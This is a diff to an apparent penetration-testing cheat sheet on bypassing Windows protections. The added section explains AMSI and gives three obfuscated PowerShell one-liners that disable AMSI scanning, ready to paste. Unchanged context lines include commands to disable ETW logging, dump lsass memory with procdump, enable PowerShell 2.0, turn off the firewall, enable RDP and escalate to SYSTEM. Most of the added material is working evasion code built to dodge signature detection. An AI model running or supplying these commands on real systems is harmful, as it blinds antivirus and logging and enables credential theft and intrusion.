@@ -5,13 +5,14 @@ Protection bypass - Usefull commands & tricks
 INDEX
 ---------
 1. Commands to disable/bypass Windows Defender AV
-2. Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
-3. Commands to bypass/disable Applocker (with local admin priv)
-4. Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
-5. Commands to disable/enable the Windows Firewall 
-6. Commands to enable RDP Access on a Windows machine
-7. Methods to run commands as "NT Authority/System"
-8. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
+2. Commands to bypass the Antimalware Scan Interface (AMSI) for the current PowerShell session
+3. Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
+4. Commands to bypass/disable Applocker (with local admin priv)
+5. Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
+6. Commands to disable/enable the Windows Firewall 
+7. Commands to enable RDP Access on a Windows machine
+8. Methods to run commands as "NT Authority/System"
+9. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
 
 
 ==================================================================================================================
@@ -80,7 +81,70 @@ Note: Needs to be run from an ELEVATED shell
 
 
 ==================================================================================================================
-2. Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
+2. Commands to bypass the Antimalware Scan Interface (AMSI) for the current PowerShell session
+==================================================================================================================
+
+The AMSI is an interface on which applications or services (third-party included) are able to scan a script’s content for malicious usage. 
+If a signature in the script is registered by the AMSI antimalware service provider (Windows Defender by default), it will be blocked.
+
+To put this into context, consider the following steps PowerShell takes to integrate with AMSI:
+> When a PowerShell process is created, AMSI.DLL is loaded from disk into its address space.
+> Within AMSI.DLL, there’s a function known as AmsiScanBuffer(), essentially the function used to scan a script’s content.
+> In the PowerShell command prompt, any supplied content would first be sent to AmsiScanBuffer(), before any execution takes place.
+> Subsequently, AmsiScanBuffer() would check with the registered anti-virus to determine if any signatures have been created.
+> If the content is deemed malicious, it would be blocked.
+
+Since AMSI relies on being loaded within the process executing the actual script, techniques to break or patch specific functions within amsi.dll are well known.
+
+There are many techniques to bypass AMSI such as:
+- patching the amsi.dll in memory
+- setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed' are encoded to avoid the AV to detect and block the AMSI bypass)
+- forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
+- placing a separate amsi.dll in the current working directory (note: legacy technique)
+- registry key modification
+The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 
+
+
+# AMSI Bypass generator website
+================================
+-> https://amsi.fail
+
+The website generates obfuscated PowerShell snippets that break or disable AMSI for the current process. 
+The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. 
+Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.
+
+
+Example - AMSI bypass commands using Matt Graebers' reflection method
+-----------------------------------------------------------------------------
+PS C:> $MM=$null;$oahvolu="$([cHAr]([bYte]0x53)+[cHAR](121*105/105)+[chAr](115+21-21)+[Char]([byTe]0x74)+[CHaR]([byte]0x65)+[ChaR](75+34)).$([Char]([bYTe]0x4d)+[cHAr]([bYtE]0x61)+[ChAR]([bytE]0x6e)+[Char](97+61-61)+[CHAr]([BYTe]0x67)+[CHar](101*38/38)+[cHAR](109*96/96)+[CHaR](101)+[CHAr](86+24)+[cHaR]([Byte]0x74)).$([char](65+12-12)+[CHar]([byTE]0x75)+[chAR]([BYte]0x74)+[CHaR]([ByTE]0x6f)+[chAr](55+54)+[CHAR]([byte]0x61)+[CHAR]([BytE]0x74)+[chaR]([ByTe]0x69)+[CHaR]([BYTE]0x6f)+[CHar](110+76-76)).$(('Ämsì'+'Utìl'+'s').NOrmALiZe([cHAr]([ByTE]0x46)+[chAR](111)+[cHar](114+45-45)+[chAR](12+97)+[char](68+48-48)) -replace [ChaR](92*66/66)+[ChAr]([Byte]0x70)+[chAr](123)+[Char](77)+[cHAr]([byTE]0x6e)+[chAR]([BYTe]0x7d))";
+PS C:> $xozwyfnqwkcxmnbsqtqacevqk="+('jîrygvef'+'bqvkndgn').nORmAlIzE([CHar]([BytE]0x46)+[CHAr](111*90/90)+[cHar]([bYTe]0x72)+[ChAr]([bYte]0x6d)+[chaR](68)) -replace [ChAR]([byte]0x5c)+[cHAr]([bYTe]0x70)+[Char](123*44/44)+[CHar](77)+[CHar]([byTe]0x6e)+[chaR]([BYtE]0x7d)";
+PS C:> [Threading.Thread]::Sleep(442);
+PS C:> [Ref].Assembly.GetType($oahvolu).GetField($([ChAR](97*86/86)+[Char](109+61-61)+[cHaR]([ByTE]0x73)+[ChaR](105)+[char]([BYtE]0x49)+[CHaR](110+46-46)+[CHar](105)+[ChaR]([bYTE]0x74)+[CHAr]([byTe]0x46)+[chAr]([BYtE]0x61)+[ChAR](105*3/3)+[ChAR]([byte]0x6c)+[cHAr]([BYTE]0x65)+[CHAR](100+38-38)),"NonPublic,Static").SetValue($MM,$true);
+
+
+Example - AMSI bypass commands using Matt Graebers' second reflection method
+-----------------------------------------------------------------------------
+PS C:> $nQdsMXey=$null;
+PS C:> $ofgiwluz="$([char](83+26-26)+[ChaR](121)+[chAr](115+31-31)+[CHar]([byTE]0x74)+[cHAR]([byTe]0x65)+[CHar](109+91-91)).$(('Mânã'+'geme'+'nt').NorMAlize([cHAr]([byte]0x46)+[cHAr]([byTE]0x6f)+[CHar](114+43-43)+[cHAR]([BYTE]0x6d)+[CHAr](68*8/8)) 
+-replace [CHaR](84+8)+[cHar](112+83-83)+[ChAr](123*45/45)+[chaR](77*13/13)+[CHar](110*71/71)+[char](125+28-28)).$(('Äutõmât'+'îón').NOrmalIZe([cHAr](70*27/27)+[CHar]([BytE]0x6f)+[char](21+93)+[cHar](29+80)+[CHAR]([BYTe]0x44)) 
+-replace [cHaR]([BYtE]0x5c)+[cHar]([ByTE]0x70)+[chaR](123+20-20)+[chAR](77*29/29)+[char]([BYTe]0x6e)+[chAr]([ByTE]0x7d)).$(('ÁmsìUtî'+'ls').nOrmalIzE([CHAR]([BytE]0x46)+[ChaR](111)+[CHar]([byTE]0x72)+[chaR]([BYte]0x6d)+[Char]([bytE]0x44)) 
+-replace [cHAR](92+75-75)+[chAR](112)+[chaR]([BytE]0x7b)+[cHaR]([BYTe]0x4d)+[cHaR]([bYtE]0x6e)+[chAr]([ByTe]0x7d))";
+PS C:> $inswncssfkwdysj="+[Char](101*12/12)+[ChAr]([BYTe]0x77)+[ChAR](116)+[CHaR]([byte]0x62)+[CHar]([ByTe]0x61)";
+PS C:> [Threading.Thread]::Sleep(400);[Runtime.InteropServices.Marshal]::("$(('Wrît'+'eÎnt'+'32').NOrMaliZE([Char]([byte]0x46)+[cHAR](1+110)+[CHAr]([BYte]0x72)+[CHaR](109+80-80)+[chAr]([bYte]0x44)) -replace [CHaR]([bytE]0x5c)+[chAR](112*52/52)+[CHAr]([Byte]0x7b)+[cHaR]([byte]0x4d)+[Char](110*89/89)+[chAR](125*120/120))")([Ref].Assembly.GetType($ofgiwluz).GetField("$(('ãmsî'+'Cónt'+'ext').NOrMalizE([CHaR]([BYTE]0x46)+[ChAr]([ByTE]0x6f)+[ChAR](114+56-56)+[CHAr](109+29-29)+[CHar](47+21)) -replace [Char]([BYte]0x5c)+[char]([bYte]0x70)+[cHar](123+37-37)+[ChaR](77*50/50)+[chAr](110*8/8)+[chAR](125))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($nQdsMXey),0x62c526aa);
+
+
+Example - AMSI bypass commands by forcing the AMSI initialization to fail in a PowerShell session
+--------------------------------------------------------------------------------------------------
+PS C:> $KvFBfyuUN=$null;
+PS C:> $srbyeq=[$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076));
+PS C:> $klotrt="+[chaR]([BYtE]0x64)+[ChAr](102+92-92)+[CHAR](119*88/88)+[CHAR]([byTe]0x63)+[cHar]([BytE]0x64)+[CHaR]([bYtE]0x6c)+[CHar]([bYte]0x69)+[CHAr]([bytE]0x74)+[ChaR]([byTe]0x76)+[cHAr](100)+[cHAr](66+40)+[CHaR](104+67-67)+[chAR](121)+[cHAr]([bYte]0x6e)+[cHAr](100+46-46)+[CHaR]([byTE]0x76)+[CHAR]([bYtE]0x67)+[CHar]([bytE]0x67)+[ChaR](99)+[cHAr]([bYTE]0x78)+[ChAr](104*16/16)+[cHAR]([bYTE]0x6b)+[chaR](97)+[CHar](112)+[CHAR](110)+[CHaR](113*11/11)";
+PS C:> [Threading.Thread]::Sleep(960);
+PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$([cHAR](97)+[cHar](109*42/42)+[chAr]([Byte]0x73)+[Char]([byTE]0x69)+[ChaR]([bytE]0x53)+[chAR](101*79/79)+[CHAR]([BYTE]0x73)+[CHar](115)+[char](105)+[CHAr](111)+[CHAr](63+47))", "NonPublic,Static").SetValue($KvFBfyuUN, $null);
+PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$(('âm'+'sì'+'Có'+'nt'+'ex'+'t').NORMaLIZe([cHaR]([byTE]0x46)+[chAR]([byte]0x6f)+[cHaR]([BYtE]0x72)+[CHAr]([byte]0x6d)+[chAr](68)) -replace [CHaR]([BytE]0x5c)+[chAr](112*50/50)+[cHAR](77+46)+[CHAR]([ByTE]0x4d)+[Char](110*8/8)+[CHAr](125*18/18))", "NonPublic,Static").SetValue($null, [IntPtr]$srbyeq);
+
+
+==================================================================================================================
+3. Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
 ==================================================================================================================
 
 The PowerShell command displayed below sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables 
@@ -105,7 +169,7 @@ To kill an existing session, run the command 'logman stop <SessionName> -ets' as
 
 
 ==================================================================================================================
-3. Commands to bypass/disable Applocker (with local admin priv)
+4. Commands to bypass/disable Applocker (with local admin priv)
 ==================================================================================================================
 
 > Usefull inks:
@@ -153,7 +217,7 @@ C:\Temp> procdump.exe -accepteula -ma lsass.exe memorydump.dmp
 
 
 ==================================================================================================================
-4. Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
+5. Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
 ====================================================================================================================
 
 Since there is no AMSI in PowerShell v2.0 it is interesting to use it when possible. 
@@ -169,7 +233,7 @@ C:\> Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root
 
 
 ==================================================================================================================
-5. Commands to disable/enable the Windows Firewall 
+6. Commands to disable/enable the Windows Firewall 
 ==================================================================================================================
 
 To turn OFF/ON the firewall for all 3 'networks'
@@ -192,7 +256,7 @@ netsh firewall add portopening TCP 8443 PLESK-ADMIN ENABLE ALL
 
 
 ==================================================================================================================
-6. Commands to enable RDP Access on a Windows machine
+7. Commands to enable RDP Access on a Windows machine
 ==================================================================================================================
 C:\> reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 
@@ -202,7 +266,7 @@ C:\> netsh firewall set service remotedesktop enable
 
 
 ==================================================================================================================
-7. Methods to run commands as "NT Authority/System"
+8. Methods to run commands as "NT Authority/System"
 ==================================================================================================================
 
 From (Local) Administrator to "NT Authority/System":
@@ -246,7 +310,7 @@ From (Local) Administrator to "NT Authority/System":
   
 
 ==================================================================================================================
-8. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
+9. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
 ==================================================================================================================
 
 Context: During an internal penetration test you are logged into a Windows server using RDP with a local admin account.
